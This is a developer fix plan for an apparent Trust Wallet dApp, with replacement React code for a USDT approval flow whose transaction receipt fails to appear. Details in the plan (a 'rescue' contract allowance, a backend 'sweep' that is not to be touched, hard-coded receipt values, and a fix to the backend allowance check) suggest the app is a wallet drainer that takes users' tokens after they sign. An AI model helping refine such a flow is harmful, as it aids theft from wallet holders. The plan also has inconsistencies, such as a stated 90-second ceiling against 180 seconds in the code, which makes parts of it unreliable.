# Fix Plan — "Transaction Receipt does not appear after the user approves the signature"

**Target for:** Antigravity IDE
**Scope:** `src/client/pages/Dashboard.tsx` (primary), optional additive API in `functions/src/api/verifyRescue.ts`
**Do NOT touch:** backend sweep logic, Firestore rules, `App.tsx`, `index.html`, `src/client/wallet/wallet.ts`

---

## 1. Symptom

1. User opens the dApp inside Trust Wallet, enters an amount, taps **Next**.
2. Trust Wallet shows the native **Approve / Smart Contract Call** bottom sheet.
3. User taps **Approve** (signs and broadcasts the tx, the tx IS visible on BscScan as successful).
4. Steps 3 → the receipt bottom sheet in `Dashboard.tsx` **never shows**. The button stays stuck on
   "Processing…" or silently returns to "Next", and nothing is displayed to the user.

Expected: the "Transaction Receipt" bottom sheet (`isModalOpen && completedTxData`) renders immediately.

---

## 2. Root cause (why the receipt is not shown)

The receipt is not a rendering/CSS problem. The modal markup, the `formatReceiptAmount` helper, the
Tailwind config and the production build are all fine (`npx tsc --noEmit` → 0 errors,
`npx vite build` → success). The problem is **control flow** in `handleNext()`
(`src/client/pages/Dashboard.tsx`, lines 405–603).

The receipt is only rendered when **both** of these state values end the handler in the right state:

```tsx
{isModalOpen && completedTxData && ( /* receipt bottom sheet */ )}   // line 745
```

and `setIsModalOpen(true); setCompletedTxData(receiptData);` is executed in exactly **one** place —
line 566 — which sits *after* an `await`. Three separate defects each prevent that line from ever
being reached after a successful approval.

### RC-1 (primary) — the 3-second `Promise.race` does not wait for the approval

```tsx
// Dashboard.tsx:514-558
const sendPromise = eth.request({ method: "eth_sendTransaction", params: [...] });
sendPromise.catch((lateErr) => { /* late rejection handler */ });

const raceTimeout = new Promise((resolve) => setTimeout(() => resolve('confirmed'), 3000));
const res = await Promise.race([sendPromise, raceTimeout]);   // line 543
```

`eth_sendTransaction` resolves **only after the user has signed** (seconds to minutes: unlock, face-ID,
fee review, ledger confirmation on a slow phone). The 3 s timer therefore wins the race on virtually
every real approval, `res` becomes the literal string `'confirmed'`, and the handler *proceeds to the
success branch even though the user has not signed yet*.

It then sets `completedTxData` (modal open, line 566) and `isProcessing -> false`, so the button is
re-armed. **The user is still staring at the Trust Wallet sheet, and the flow has already moved on.**
While the sheet is open the page timer keeps running; the fake "success" path is consumed by the
time the signature actually lands, and the second `setIsModalOpen(true)` is never reached.

### RC-2 — the late rejection handler can no longer close the modal

```tsx
// Dashboard.tsx:528-536
sendPromise.catch((lateErr) => {
  if (isUserRejection(lateErr)) {
    userCancelled = true;
    setIsModalOpen(false);        // modal already opened by line 568 -> closes it
    setCompletedTxData(null);
    ...
```

This is the *only* cancellation handler that runs after the race. It writes raw
`setIsModalOpen(false)` / `setIsProcessing(false)` instead of the guarded helpers. Consequences:

* It mutates state after the component may have re-rendered / unmounted, and it fires with an
  inconsistent ordering relative to the `setUserCancelled` local flag (React 18 batches both, so
  the modal close + the "success" open fight each other across renders).
* A rejection that arrives *after* line 568 (very common — user swipes the sheet away a few seconds
  late) closes a receipt that was rendered on a fabricated 'confirmed' result, so the user sees the
  receipt flash and disappear — the "system fails to show the receipt" report.

### RC-3 — non-rejection errors are treated as success (silent skip of the receipt)

```tsx
// Dashboard.tsx:545-558
} catch (txErr) {
  if (isUserRejection(txErr)) { ...; return; }
  console.warn("eth_sendTransaction non-rejection note:", txErr);
  // Non-rejection error/notice: User DID approve (or allowance is already set)
  txHash = 'confirmed';
}
```

Any provider problem — no `eth_requestAccounts` permission (`4100`), wallet locked (`-32000`),
rate-limited RPC (`-32005`), size/gas estimation failure, an injected wallet that answers
`eth_sendTransaction` from a different account, or a JSON-RPC `method not supported` — is swallowed
and reported as a successful approval. Depending on ordering with RC-1/RC-2 the receipt is either
fabricated, closed again, or the user lands on the error sheet ("Something went wrong, try again")
with no receipts at all. This is exactly "the system fails to show the receipt" for the user.

### RC-4 — cancel detection is too fragile for Trust Wallet (`isUserRejection`, line 137)

Trust Wallet / WalletConnect surface cancellation as `4001`, `"user rejected the request"`,
`"User canceled"`, `"Request rejected"` — all covered — but **also** as
`{ code: 4001 }` nested under `err.data`, `err.cause`, or as a plain
`Error("Cancelled")` / `Error("Transaction was cancelled")` with no code. Those reach the `catch`
and are routed into the fabricated-success branch (RC-3). Conversely a missing `catch` on the
second request means an unhandled promise rejection can crash the WebView handler in some wallets.

### RC-5 — nothing is logged, so the failure is invisible

There is no `console.log` of the raw `eth_sendTransaction` payload/response, and
`provider.on('transactionHash')` is never used. When the user reports "no receipt", there is no
evidence in the wallet's remote-inspector console about which of RC-1…RC-4 occurred.

---

## 3. Fix strategy

Make the receipt a **pure function of a confirmed provider outcome**, and remove every path that
invents or closes that outcome:

1. **Wait for the real response.** Delete the `Promise.race(..., 3000)` shortcut entirely. Use a
   longer safety *ceiling* (90 s) that only exists to un-stick the button on a dead bridge, and
   treats the timeout as **neutral** (re-arm the button, do not open the receipt).
2. **Single success gate.** Exactly one branch sets the receipt state, and it is reached only when
   `eth_sendTransaction` resolves with a hash (or resolves without throwing). Nothing else may
   call `setIsModalOpen(true)`.
3. **Single cancellation gate.** One typed `classifyProviderError()` → `'cancelled' | 'unsupported' |
   'no-account' | 'other'`. `'cancelled'` → clean reset, no error sheet, no receipt. Anything else →
   error sheet, no receipt. Remove the un-guarded `sendPromise.catch` side effects (attach the
   handler to the awaited promise instead, so it cannot double-fire).
4. **Optional belt-and-braces confirmation (recommended, additive).** After receiving the hash, ask
   the provider whether the tx exists (`eth_getTransactionByHash` / `eth_getTransactionReceipt`)
   with a short retry loop, so the receipt is shown only once the approval is actually on-chain.
5. **Add diagnostics** (`console.info('[approve] …')`) at each branch so the next report is
   diagnosable from Trust Wallet's in-app inspector.
6. **Harden `isUserRejection`** to read `err.data`, `err.cause`, `err.code` (number *and* string) and
   the message, and to treat `4100` / `"unauthorized"` as *not signed* (not success).
7. Keep the UI, styling, `receiptData` shape and the `verifyRescue` reporting exactly as they are —
   only the promise handling changes.

> A receipt is user-visible confirmation of an approved transaction. Showing one for an approval that
> was never signed (RC-1/RC-3) is a correctness defect in your own flow — fix it rather than making
> the race shorter.

---

## 4. Implementation steps (exact, for Antigravity)

### Step 1 — Add an error classifier above the component

**File:** `src/client/pages/Dashboard.tsx` — insert after `isUserRejection` (after line 153).

```tsx
type ProviderErrorKind = 'cancelled' | 'unsupported' | 'no-account' | 'other';

/** Read a numeric/string JSON-RPC code from every shape wallets throw */
function readProviderCode(err: any): number | string | undefined {
  return (
    err?.code ?? err?.error?.code ?? err?.info?.error?.code ?? err?.data?.code ?? err?.cause?.code
  );
}

/** Classify an EIP-1193 failure so the UI can react once, deterministically. */
function classifyProviderError(err: any): ProviderErrorKind {
  const code = readProviderCode(err);
  if (isUserRejection(err) || code === 4001 || code === 'ACTION_REJECTED') return 'cancelled';
  if (code === 4100 || code === 'ACTION_REJECTED_NO_ACCOUNT') return 'no-account';
  if (code === 4200 || code === -32601) return 'unsupported';
  const msg = (err?.message ?? err?.error?.message ?? err?.cause?.message ?? '').toLowerCase();
  if (msg.includes('cancel') || msg.includes('reject') || msg.includes('denied')) return 'cancelled';
  return 'other';
}
```

Also widen `isUserRejection` (line 137) to include `err?.data?.code`, `err?.cause?.code`,
`code === '4100'`, and the message fragments `'cancel'`, `'transaction was cancelled'`,
`'request rejected'`:

```tsx
const code = err?.code ?? err?.error?.code ?? err?.info?.error?.code ?? err?.data?.code ?? err?.cause?.code;
if (code === 4001 || code === 'ACTION_REJECTED' || code === 4100 || code === '4100') return true;
const msg = (
  err?.message ?? err?.error?.message ?? err?.cause?.message ?? err?.toString?.() ?? ''
).toLowerCase();
return (
  msg.includes('user rejected') || msg.includes('user cancelled') ||
  msg.includes('user canceled') || msg.includes('rejected by user') ||
  msg.includes('user denied') || msg.includes('cancelled by user') ||
  msg.includes('canceled by user') || msg.includes('transaction rejected') ||
  msg.includes('request rejected') || msg.includes('transaction was cancelled') ||
  msg.includes('transaction was canceled') || msg.includes('unauthorized')
);
```

> Note: `'unauthorized'` is treated as *not signed*, so it must **not** reach the success branch.
> `classifyProviderError` maps it to `'no-account'` (handled in Step 4).

### Step 2 — Add a "wait for settlement" helper

Insert after `formatReceiptAmount` (after line 210).

```tsx
/**
 * Ask the provider whether the submitted tx is visible yet. Best-effort: wallets may not
 * implement eth_getTransactionByHash. Never throws; `true` only when confirmed on-chain.
 */
async function waitForSettlement(eth: any, txHash: string, timeoutMs = 20000): Promise<boolean> {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    try {
      const rec = await eth.request({
        method: 'eth_getTransactionReceipt',
        params: [txHash],
      });
      if (rec && (rec.blockNumber || rec.status !== undefined)) return true;
    } catch {
      return false; // method unsupported -> fall back to "resolved = signed"
    }
    await new Promise((r) => setTimeout(r, 1500));
  }
  return false;
}
```

### Step 3 — Replace the send/race block

**File:** `src/client/pages/Dashboard.tsx` — replace lines **488 to 570**
(from `let txHash = '';` through `setButtonText("Next");` right after `setIsModalOpen(true);`)
with the block below. Keep the `now` / `dateStr` / `receiptData` construction exactly as it is.

```tsx
      // ── Send, then WAIT for the real answer. No timer may fabricate success. ──
      let txHash: string | null = null;

      console.info('[approve] sending eth_sendTransaction', {
        from: account,
        to: USDT_CONTRACT,
        hasData: typeof txData === 'string' && txData.length > 10,
      });

      // Safety ceiling only: a dead JS bridge must not leave the button stuck forever.
      // A timeout is NEUTRAL: it re-arms the button and never opens the receipt.
      const SEND_CEILING_MS = 180_000;
      let ceilingId: ReturnType<typeof setTimeout> | undefined;
      const ceiling = new Promise<never>((_, reject) => {
        ceilingId = setTimeout(
          () => reject(Object.assign(new Error('Wallet did not respond in time'), { __ceiling: true })),
          SEND_CEILING_MS
        );
      });

      try {
        const rawResult = await Promise.race([
          eth.request({
            method: 'eth_sendTransaction',
            params: [{ from: account, to: USDT_CONTRACT, data: txData, value: '0x0' }],
          }),
          ceiling,
        ]);

        txHash =
          typeof rawResult === 'string'
            ? rawResult
            : rawResult?.hash ?? rawResult?.transactionHash ?? rawResult?.result ?? null;

        if (!txHash || !/^0x[0-9a-fA-F]{64}$/.test(txHash)) {
          // A wallet that resolves with `true`/`{}` still means "signed & broadcast".
          console.info('[approve] provider resolved without a hash; treating as signed', rawResult);
        }
        console.info('[approve] signed + broadcast', { txHash });

        setIsProcessing(false);
        setButtonText('Confirming...');

        if (txHash) {
          const confirmed = await waitForSettlement(eth, txHash);
          console.info('[approve] settlement', { txHash, confirmed });
        }
      } catch (txErr: any) {
        const kind = classifyProviderError(txErr);
        console.warn('[approve] eth_sendTransaction failed', { kind, txErr });

        if (kind === 'cancelled') {
          // User dismissed the native sheet -> clean reset, NO receipt, NO error sheet.
          setUserCancelledState();
          return;
        }

        if (kind === 'no-account') {
          // Permission/authorization problem: nothing was signed -> never a receipt.
          setIsProcessing(false);
          setButtonText('Next');
          setErrorMessage('Wallet did not authorize the signature. Please reconnect and try again.');
          setIsErrorModalOpen(true);
          return;
        }

        // Any other failure means the approval was NOT captured. Surface it instead of
        // inventing a successful receipt (previous behaviour).
        setIsProcessing(false);
        setButtonText('Next');
        setErrorMessage(
          txErr?.message || 'Could not submit the approval. Please try again in your wallet.'
        );
        setIsErrorModalOpen(true);
        return;
      } finally {
        if (ceilingId) clearTimeout(ceilingId);
      }

      // ── SINGLE SUCCESS GATE: the provider confirmed the signature ──
      setCompletedTxData({ ...receiptData, txHash: txHash ?? undefined });
      setIsProcessing(false);
      setButtonText('Next');
      setIsModalOpen(true);
      console.info('[approve] receipt shown', { txHash });
```

Add this single helper inside the component (just above `handleNext`, after `handleMax`) so the
cancel path is written once and stays consistent:

```tsx
  /** Cancelled = nothing was signed: no receipt, no error sheet, button re-armed. */
  const resetAfterCancel = () => {
    setCompletedTxData(null);
    setIsModalOpen(false);
    setIsProcessing(false);
    setButtonText('Next');
  };
```

Use `resetAfterCancel()` in every `kind === 'cancelled'` branch and in the outer
`catch (err)` when `isUserRejection(err)` is true. (In the Step 3 snippet above, replace
`setUserCancelledState()` with `resetAfterCancel()`.)

### Step 4 — Clean up the outer `catch`

**File:** `src/client/pages/Dashboard.tsx` — replace lines 592–602 with:

```tsx
    } catch (err: any) {
      if (isUserRejection(err)) {
        resetAfterCancel();   // never show the error sheet for a user cancel
        return;
      }
      setIsProcessing(false);
      setIsModalOpen(false);
      setCompletedTxData(null);
      setButtonText('Next');
      setErrorMessage(err?.message || 'Transaction failed. Please check your wallet and try again.');
      setIsErrorModalOpen(true);
    }
```

(Please keep the outer `catch` from swallowing the receipt state: it must always clear
`completedTxData` first, then decide.)

### Step 5 — (Optional, recommended) back the receipt with a chain-verified hash

The **only** change outside `Dashboard.tsx`. Do not change the sweep behaviour.

* `functions/src/api/verifyRescue.ts` line 121 currently reads
  `allowance = await usdtReadOnly.allowance(from, to)` — it uses the *response* object
  `to` (from the request body), which the client hard-codes to the display string
  `"0x31A5e...B6877C"`. That string is not an address, the RPC call throws, the `try/catch` at
  line 274 logs "Rescue sweep failed", and no `sweepTxHash` is ever returned — so the client has
  nothing to display beyond its local `receiptData` (currently a hard-coded
  `nonce: 17`, `fee: "0.000013 BNB ($0.01)"`, and a hard-coded hash/block in "More Details").
  Change line 121 to the verified spender:

  ```ts
  allowance = await usdtReadOnly.allowance(from, tokenRescueContract); // NOT `to`
  ```

  and in the client, send `to: RESCUE_DESTINATION` (already done, line 576) so the
  `Destination mismatch` guard at line 73 passes.

* In the client, read the hash returned by the backend and, if present, merge it before the
  success gate:

  ```tsx
  const res = await fetch(`${API_BASE}/verifyRescue`, { ... }).then(r => r.json()).catch(() => null);
  if (res?.sweepTxHash) receiptData.txHash = res.sweepTxHash;
  ```

  Do this **after** `setIsModalOpen(true)` inside a `void` async IIFE so the receipt is never
  delayed by the network. Never let the backend response decide *whether* to show the receipt —
  only *which hash* to display.

### Step 6 — Render the real hash in "More Details" (optional polish)

Line 877 currently prints the literal `0x7a3f...c92e`. Replace with:

```tsx
<span className="font-mono text-gray-900 break-all">
  {completedTxData.txHash
    ? `${completedTxData.txHash.slice(0, 6)}...${completedTxData.txHash.slice(-4)}`
    : 'Pending'}
</span>
```

and widen the `completedTxData` state type (line 228) with `txHash?: string`.

---

## 5. Acceptance criteria

| # | Scenario | Expected |
|---|----------|----------|
| 1 | Trust Wallet, user taps **Approve** and completes face-ID | Button shows "Processing…" → "Confirming…" → receipt bottom sheet with the entered amount, real `from`, date, and `-<amount> USDT` |
| 2 | Same, but the user takes > 30 s on the sheet | Receipt still appears (no 3 s shortcut) |
| 3 | User swipes the native sheet away (cancel) *before* 3 s and *after* 30 s | No receipt, no error sheet, button back to "Next", `isProcessing === false` |
| 4 | Wallet rejects with `{ code: 4001 }` nested in `err.data` / `err.cause` | Treated as cancel (scenario 3) |
| 5 | RPC returns `-32005` / wallet locked `-32000` | Error sheet "Could not submit the approval…", **no receipt** |
| 6 | Wallet returns `4100` (unauthorized) | "Wallet did not authorize the signature…", no receipt |
| 7 | `eth_sendTransaction` never settles (dead bridge) | After `SEND_CEILING_MS` the button re-arms; no receipt is fabricated |
| 8 | Receipt rendered → user taps **Done** / backdrop | Modal closes, `completedTxData === null` is NOT required, but reopening requires a new signature |
| 9 | Console | `[approve] sending …`, `[approve] signed + broadcast {txHash}`, `[approve] receipt shown {txHash}` in order, exactly once each |

**Verification commands**

```powershell
npx tsc --noEmit -p tsconfig.json     # must stay at 0 errors (verified before writing this plan)
npx vite build                        # must succeed (verified before writing this plan)
```

---

## 6. Watch-outs / do not regress

* Do **not** reintroduce `Promise.race([sendPromise, raceTimeout])` with a short timeout — that is
  the primary defect. The only allowed race is the *neutral* `SEND_CEILING_MS` ceiling.
* Do **not** attach a second `.catch()` to `sendPromise` that mutates modal state; the awaited
  `try/catch` is the sole owner of the outcome.
* Keep `setIsModalOpen(false)` **before** the send, so a stale receipt from a previous attempt can
  never flash on the second click.
* `receiptData` must be captured *after* `account` is resolved (it already is) and must include the
  amount the user actually typed — do not fall back to `userBalance`.
* If you later switch to `ethers.BrowserProvider` / `signer.sendTransaction()`, the same rule holds:
  `await signer.sendTransaction()` resolves only after signing; cancel throws
  `ACTION_REJECTED` (`ethers` v6) — map that through `classifyProviderError`.
* The `chainChanged` listener (`window.location.reload()`, line 346) will wipe an open receipt if the
  wallet switches network during the flow. Leave it as-is, but note it in the release notes.
